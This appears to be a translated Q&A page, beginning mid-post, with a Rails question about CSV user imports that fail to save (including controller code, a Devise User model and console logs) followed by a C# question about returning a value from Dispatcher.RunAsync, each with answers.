  User Exists (0.2ms)  SELECT 1 FROM "users" WHERE "users"."email" = 'duncansingleton@****.com' LIMIT 1
   (0.1ms)  rollback transaction
   (0.1ms)  begin transaction
   (0.4ms)  UPDATE "imports" SET "processed" = 4, "updated_at" = '2012-07-10 16:52:01.146297' WHERE "imports"."id" = 13
[paperclip] Saving attachments.
   (3.5ms)  commit transaction 
```

这是我在导入控制器中的代码

```
def new_user(line)
    params = Hash.new
    params[:user] = Hash.new
    params[:user]["email"] = line[0]
    params[:user]["gender"] = "male"
    params[:user]["password"] = "abc231"
    params[:user]["first_name"] = line[1]
    params[:user]["last_name"] = line[3]
    user = User.new(params[:user])
    user.save
  end

def proc_csv
    @import = Import.find(params[:id])
    lines = parse_csv_file(@import.csv.path)
    lines.shift #comment this line out if your CSV file doesn't contain a header row
    if lines.size > 0
      @import.processed = lines.size
      lines.each do |line|
        case @import.datatype
          when "releases"
            new_user(line)
            flash[:notice] = "Saving data processing was successful."
        end
      end
      @import.save
      flash[:notice] = "CSV data processing was successful."
      redirect_to :action => "show", :id => @import.id
    else
      flash[:error] = "CSV data processing failed."
      render :action => "show", :id => @import.id
    end
  end

  private

  def parse_csv_file(path_to_csv)
    lines = []

    #if not installed run, sudo gem install fastercsv
    #http://fastercsv.rubyforge.org/
    require 'csv'

    CSV.foreach(path_to_csv) do |row|
      lines << row
    end
    lines
  end 
```

用户模型

```
class User < ActiveRecord::Base
  # Include default devise modules. Others available are:
  # :token_authenticatable, :confirmable,
  # :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable, :omniauthable

  # Setup accessible (or protected) attributes for your model
  attr_accessible :email, :password, :password_confirmation, :remember_me, :admin, :manager
  attr_accessible :provider, :uid
  # attr_accessible :title, :body

  belongs_to :team
  has_many :availabilities
  attr_accessible :last_name, :first_name, :jersey, :dob, :gender, :position, :team_id, :mobile, :state, :city, :postcode

  GENDER_TYPES = [:Male, :Female]
  STATE_TYPES = [:ACT, :VIC, :QLD, :NSW, :TAS, :NT, :WA, :SA]

  validates :first_name, :last_name, :gender, :presence => true
  validates :email, :presence => true, :uniqueness => true
  validates_format_of :email, :with => /^([^@\s]+)@((?:[-a-z0-9]+\.)+[a-z]{2,})$/i, :message => "isn't a valid email address"
  validates_format_of :mobile, :with => /^(?:\+?61|0)4(?:[01]\d{3}|(?:2[1-9]|3[0-57-9]|4[7-9]|5[0-35-9]|6[679]|7[078]|8[178]|9[7-9])\d{2}|(?:20[2-9]|444|68[3-9]|79[01]|820|901)\d|(?:200[01]|2010|8984))\d{4}$/, :message => "isn't a valid mobile number", :allow_blank => true
  validates_format_of :postcode, :with => /^[0-9]{4}/, :message => "isn't a valid Australian postcode", :allow_blank => true 
```

导轨控制台消息

```
1.9.3p194 :001 > params = {
1.9.3p194 :002 >                :user => {
1.9.3p194 :003 >                          :gender => "male",
1.9.3p194 :004 >                       :last_name => "paul",
1.9.3p194 :005 >                        :password => "abc231",
1.9.3p194 :006 >                      :first_name => "mcguane",
1.9.3p194 :007 >                           :email => "paul.mcguane1@westnet.com.au"
1.9.3p194 :008?>                }
1.9.3p194 :009?>            }
 => {:user=>{:gender=>"male", :last_name=>"paul", :password=>"abc231", :first_name=>"mcguane", :email=>"paul.mcguane1@westnet.com.au"}} 
1.9.3p194 :010 > user = User.new(params[:user])
 => #<User id: nil, postcode: nil, city: nil, state: nil, manager: nil, admin: nil, mobile: nil, team_id: nil, position: nil, gender: "male", dob: nil, email: "paul.mcguane1@westnet.com.au", jersey: nil, last_name: "paul", first_name: "mcguane", created_at: nil, updated_at: nil, encrypted_password: "$2a$10$i81k9gX3uYJ95oID.deGyOtDGFSnK6ooI0BIUiP6UtgZ...", reset_password_token: nil, reset_password_sent_at: nil, remember_created_at: nil, sign_in_count: nil, current_sign_in_at: nil, last_sign_in_at: nil, current_sign_in_ip: nil, last_sign_in_ip: nil, provider: nil, uid: nil> 
1.9.3p194 :011 > user.valid?
  User Exists (0.2ms)  SELECT 1 FROM "users" WHERE "users"."email" = 'paul.mcguane1@westnet.com.au' LIMIT 1
  User Exists (0.1ms)  SELECT 1 FROM "users" WHERE "users"."email" = 'paul.mcguane1@westnet.com.au' LIMIT 1
 => true 
1.9.3p194 :012 > user.errors.full_messages
 => [] 
1.9.3p194 :013 > 
```

带有 ! 的导轨控制台 方法

```
 1.9.3p194 :013 > user.save!
   (0.1ms)  SAVEPOINT active_record_1
  User Exists (0.3ms)  SELECT 1 FROM "users" WHERE "users"."email" = 'paul.mcguane1@westnet.com.au' LIMIT 1
  User Exists (0.2ms)  SELECT 1 FROM "users" WHERE "users"."email" = 'paul.mcguane1@westnet.com.au' LIMIT 1
  SQL (135.5ms)  INSERT INTO "users" ("admin", "city", "created_at", "current_sign_in_at", "current_sign_in_ip", "dob", "email", "encrypted_password", "first_name", "gender", "jersey", "last_name", "last_sign_in_at", "last_sign_in_ip", "manager", "mobile", "position", "postcode", "provider", "remember_created_at", "reset_password_sent_at", "reset_password_token", "sign_in_count", "state", "team_id", "uid", "updated_at") VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)  [["admin", nil], ["city", nil], ["created_at", Wed, 11 Jul 2012 20:05:28 EST +10:00], ["current_sign_in_at", nil], ["current_sign_in_ip", nil], ["dob", nil], ["email", "paul.mcguane1@westnet.com.au"], ["encrypted_password", "$2a$10$i81k9gX3uYJ95oID.deGyOtDGFSnK6ooI0BIUiP6UtgZOuzWzQbFy"], ["first_name", "mcguane"], ["gender", "male"], ["jersey", nil], ["last_name", "paul"], ["last_sign_in_at", nil], ["last_sign_in_ip", nil], ["manager", nil], ["mobile", nil], ["position", nil], ["postcode", nil], ["provider", nil], ["remember_created_at", nil], ["reset_password_sent_at", nil], ["reset_password_token", nil], ["sign_in_count", nil], ["state", nil], ["team_id", nil], ["uid", nil], ["updated_at", Wed, 11 Jul 2012 20:05:28 EST +10:00]]
   (0.1ms)  RELEASE SAVEPOINT active_record_1
 => true 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T08:45:50.313

从您的代码片段和日志输出看来，由于某些验证问题，您的用户没有被保存。通常，当我遇到这样的问题时，我会直接进入 rails 控制台，看看我的代码尝试做的事情是否也可以在控制台中工作。如果它在控制台上运行，那么您的代码应该可以运行。

尝试这个

```
$ rails c --sandbox

> params = {
           :user => {
                   :gender => "male",
                :last_name => "paul",
                 :password => "abc231",
               :first_name => "mcguane",
                    :email => "paul.mcguane1@westnet.com.au"
           }
         }

> user = User.new(params[:user])
> user.valid?
> user.errors.full_messages 
```

这样，您就可以隔离用户验证是否真的是问题的原因。它可能完全是另一回事。如果您发布您的用户模型代码也会有所帮助。

我还注意到您在`lines`迭代器中设置了 Flash 通知。每次迭代一行时，您只是简单地覆盖它。

# c# - 如何将值从 Dispatcher 或 Task 传递到外部？

> ID：11427999
> 
> 赞同：1
> 
> 时间：2012-07-11T07:51:56.087
> 
> 标签：c#, asynchronous, task, dispatcher, async-await

谁能帮我在任务之间传递变量？

我遇到了关于 Dispatcher.RunAsync() 的麻烦。我将变量 RssItem 声明为 RSSItem 的类型。我正在尝试将 Dispatcher.RunAsync(...) 中的 await m_RSSReader.CreateRSSItem() 返回的 RssItem 的值传递到外部以分配 m_RssItemList.Add(RssItem);。

```
RSSItem RssItem;
// Save Individual RSS items as RSSItem
foreach (SyndicationItem item in CurrentFeed.Items)
{
    //RssItem = new RSSItem();
    // by using dispatcher, it resolves the issue of lagging UI
    await Dispatcher.RunAsync(Windows.UI.Core.CoreDispatcherPriority.Normal, async () =>
        {
            RssItem = await m_RSSReader.CreateRSSItem(item.Links[0].Uri, m_CurrentRSSDataGroup, item, CurrentFeed);
        });

        if (RssItem != null)
        {
            Debug.WriteLine("RssItem Title : {0}", RssItem.Title);
            m_RssItemList.Add(RssItem);
        }
} 
```

[7/11/12] RSSItem 是我为存储创建的一个类。我使用 Dispatcher.RunAsync() 来避免 UI 中断，方法 m_RSSReader.CreateRSSItem() 将返回我想要的类 (RSSItem RssItem)。但我需要将它传递到 Dispatcher 任务之外并将 RssItem 添加到列表 (m_RssItemList.Add(RssItem)。但我无法将 RssItem 传递到 Dispatcher 之外。

谢谢，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T15:03:46.610

我不知道您是否`Task.Run`改用它来解决它，但是如果您*确实*想等待 a `dispatcher.RunAsync`，您也可以使用 a `WaitHandle`，例如 a `ManualResetEvent`。出于某种原因，`RunAsync`呼叫继续进行而实际上没有“等待”。等待句柄负责处理。

```
// assign to null, since it will be "unassigned" otherwise
RssItem rssItem = null;
EventWaitHandle waithandle = new ManualResetEvent(false);
await Dispatcher.RunAsync(Windows.UI.Core.CoreDispatcherPriority.Normal, async () =>
{
    rssItem = await m_RSSReader.CreateRSSItem(item.Links[0].Uri, m_CurrentRSSDataGroup, item, CurrentFeed);
    waithandle.Set();
});

waithandle.WaitOne();
if (rssItem != null)
{
    Debug.WriteLine("RssItem Title : {0}", rssItem.Title);
    m_RssItemList.Add(rssItem);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T11:38:17.023

我不认为`Dispatcher.RunAsync`你认为它会做。

我相信你正在寻找的是`Task.Run`，像这样的东西：

```
RssItem = await Task.Run(() =>
   m_RSSReader.CreateRSSItem(item.Links[0].Uri, m_CurrentRSSDataGroup, item, CurrentFeed)
); 
```